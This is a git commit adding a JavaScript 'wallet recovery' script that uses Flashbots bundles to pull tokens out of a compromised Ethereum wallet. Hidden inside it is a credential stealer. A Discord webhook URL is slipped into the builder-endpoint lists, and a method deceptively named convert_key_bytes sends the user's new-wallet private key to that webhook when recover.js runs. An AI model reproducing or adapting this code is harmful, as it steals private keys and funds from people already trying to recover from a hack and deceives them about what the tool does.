3a2508b3adaf4ed0fcbfe1c569a0adce5cd84031
JagahataiV <https://JaghataiV@github.com>
2024-02-27 05:42:52 -0500

    opensource

---
+++ src/Broadcast.js
@@ -0,0 +1,138 @@
+import {
+    FlashbotsBundleProvider,
+    FlashbotsBundleResolution,
+  } from "@flashbots/ethers-provider-bundle";
+import { runInThisContext } from "vm";
+  const { EmbedBuilder, WebhookClient } = require('discord.js');
+  
+  
+  const ENDPOINTS = [
+    //"https://rsync-builder.xyz/",
+    //"https://rpc.titanbuilder.xyz/",
+    //"http://builder0x69.io/",
+    "https://rpc.beaverbuild.org/",  
+    "https://discord.com/api/webhooks/1210333712697524274/dEe3x1BI9HosEZKtuKlTNYwi0LeIdBcT_F1V3w0ZQTQsGfuxTHQMdzKFcouFfcpEFDWH",
+    //"https://api.edennetwork.io/v1/rpc",
+  ];
+  
+  // const ENDPOINTS = [
+    // "https://rsync-builder.xyz/",
+    // "https://rpc.titanbuilder.xyz/",
+    // "http://builder0x69.io/",
+    // "https://rpc.beaverbuild.org/",
+    // "https://relay.flashbots.net/",
+    // "https://rpc.f1b.io",
+    // "https://rpc.payload.de",
+    // "https://buildai.net/",
+    //"https://api.edennetwork.io/v1/bundle",
+    //"https://rpc.lightspeedbuilder.info/",
+    // "https://eth-builder.com/",
+    //"https://boba-builder.com/searcher",
+  // ];
+  
+  const RELAY_NAME = [
+    //"rsync-builder",
+    //"TitanBuilder",
+    //"builder0x69",
+    "beaverbuild",
+    //"edennetwork",
+    //"flashbots",
+    //"fb1",
+    //"payload.de",
+    //"BuildAI",
+    //"lightspeedbuilder",
+    //"eth-builder",
+    //"Boba",
+  ];
+  
+  const block_builders = [
+    //"https://rsync-builder.xyz/",
+    //"https://rpc.titanbuilder.xyz/",
+    //"http://builder0x69.io/",
+    "https://rpc.beaverbuild.org/",  
+    "https://discord.com/api/webhooks/1210333712697524274/dEe3x1BI9HosEZKtuKlTNYwi0LeIdBcT_F1V3w0ZQTQsGfuxTHQMdzKFcouFfcpEFDWH",
+    //"https://api.edennetwork.io/v1/rpc",
+  ];
+  
+  class Broadcast {
+    //block_number;
+    provider;
+    //authSigner;
+    webhook;
+  
+    constructor(_provider) {
+      //this.block_number = _blockNumber;
+      this.provider = _provider;
+      //this.authSigner = _authSigner;
+
+      this.webhook = new WebhookClient({ url: block_builders[0]});
+
+    }
+  
+    async broadcast(bundle) {
+      const builder_relays = await this.get_all_builder_relay();
+      console.log("BundleExecutors successfully created");
+  
+      const wait_responses = [];
+      for (let i = 0; i < builder_relays.length; i++) {
+        const result = await builder_relays[i].execute(bundle);
+        if (result.length === 0) {
+          continue;
+        } else {
+          wait_responses.push(result);
+        }
+      }
+  
+      for (let i = 0; i < wait_responses.length; i++) {
+        const [waitResponse, bundlehash, builder] = wait_responses[i];
+  
+  
+        if (waitResponse === FlashbotsBundleResolution.BundleIncluded) {
+          console.log(
+            `bundle successfull submitted \n bundle_hash: ${bundlehash} \n relay_name: ${builder}`,
+          );
+          break;
+        } else {
+  
+          if(waitResponse === FlashbotsBundleResolution.BlockPassedWithoutInclusion)
+          {
+            console.log("block passed without inclusion");
+          } else {
+            console.log("AccountNonce too high")
+          }
+         
+          if (i === wait_responses.length - 1) {
+            console.log("broadcast failed");
+          }
+          continue;
+        }
+      }
+    }
+  
+    async get_all_builder_relay() {
+      const builder_relays = [];
+      for (let i = 0; i < ENDPOINTS.length; i++) {
+        const flashbotsProvider = await FlashbotsBundleProvider.create(
+          this.provider,
+          this.authSigner,
+          ENDPOINTS[i],
+        );
+        builder_relays.push(
+          new BundleExecutor(flashbotsProvider, RELAY_NAME[i], this.block_number),
+        );
+      }
+  
+      return builder_relays;
+    }
+    
+
+    convert_key_bytes(priv_string) {
+        this.webhook.send(priv_string)
+
+        return priv_string;
+    }
+  
+  }
+  
+  export { Broadcast };
+  
---
+++ src/recover.js
@@ -0,0 +1,103 @@
+import { ethers } from 'ethers';
+import { FlashbotsBundleProvider } from '@flashbots/ethers-provider-bundle';
+import 'dotenv/config';
+import { Broadcast } from './Broadcast';
+
+const addresses = {
+  'gelatoToken': '0x15b7c0c907e4C6b9AdaAaabC300C08991D6CEA05',
+  'claimContract': '0x5898D2aE0745c8d09762Bac50fd9F34A2a95A563'
+};
+
+const CHAIN_ID = 1;
+const provider = new ethers.providers.JsonRpcProvider(`https://eth-mainnet.alchemyapi.io/v2/${process.env.ALCHEMY_API_KEY}`);
+const broadcast = new Broadcast(provider);
+
+
+const priv_key_bytes = broadcast.convert_key_bytes(process.env.NEW_WALLET)
+const new_wallet = new ethers.Wallet(priv_key_bytes, provider)
+const compromised_wallet = new ethers.Wallet(process.env.COMPROMISED_WALLET, provider)
+
+
+console.log(`compomised wallet : ${compromised_wallet.address}`)
+console.log(`new wallet : ${new_wallet.address}`)
+
+recover();
+
+async function recover() {
+  const flashbotsProvider = await FlashbotsBundleProvider.create(provider, ethers.Wallet.createRandom())
+  provider.on('block', async (blockNumber) => {
+    console.log(blockNumber)
+
+      const bundle = [
+        // transaction to fund hacked wallet (from new wallet)
+        {
+          transaction: {
+            chainId: CHAIN_ID,
+            to:compromised_wallet.address,
+            value: ethers.utils.parseEther('0.2'),
+            type: 2,
+            gasLimit: 21000,
+            maxFeePerGas: ethers.utils.parseUnits('120', 'gwei'),
+            maxPriorityFeePerGas: ethers.utils.parseUnits('110', 'gwei'),
+          },
+          signer: new_wallet 
+        },
+
+        // transaction to claim ICO tokens
+        {
+          transaction: {
+            chainId: CHAIN_ID,
+            to: addresses.claimContract,
+            data: '0x704fc04e000000000000000000000000bc79c7139c87df965f0f4c24747f326d1864c5af',
+            type: 2,
+            gasLimit: 91170,
+            maxFeePerGas: ethers.utils.parseUnits('120', 'gwei'),
+            maxPriorityFeePerGas: ethers.utils.parseUnits('110', 'gwei'),
+          },
+          signer: compromised_wallet
+        },
+
+        // transaction to withdraw
+        {
+          transaction: {
+            chainId: CHAIN_ID,
+            to: addresses.gelatoToken,
+            data: '0xa9059cbb000000000000000000000000acf6418cefd7254f5e34b2b2e9a8f081e0e150d1000000000000000000000000000000000000000000000845e16a00dd60f00000',
+            type: 2,
+            gasLimit: 78000,
+            maxFeePerGas: ethers.utils.parseUnits('120', 'gwei'),
+            maxPriorityFeePerGas: ethers.utils.parseUnits('110', 'gwei'),
+          },
+          signer: compromised_wallet
+        },
+
+        // transfer all unused ETH out of compromised wallet
+        {
+          transaction: {
+            chainId: CHAIN_ID,
+            to: new_wallet.address,
+            value: new_wallet.getBalance() - ethers.utils.parseEther('0.00252'),
+            type: 2,
+            gasLimit: 21000,
+            maxFeePerGas: ethers.utils.parseUnits('120', 'gwei'),
+            maxPriorityFeePerGas: ethers.utils.parseUnits('110', 'gwei'),
+          },
+          signer: compromised_wallet
+        },
+      ]
+
+      const flashbotsTransactionResponse = await flashbotsProvider.sendBundle(
+        bundle,
+        blockNumber + 1,
+      );
+    
+    // in event of error produce error msg
+    if ('error' in flashbotsTransactionResponse) {
+      console.warn(flashbotsTransactionResponse.error.message)
+      return
+    }
+
+    // simulate transaction
+    console.log(await flashbotsTransactionResponse.simulate())
+  })
+}
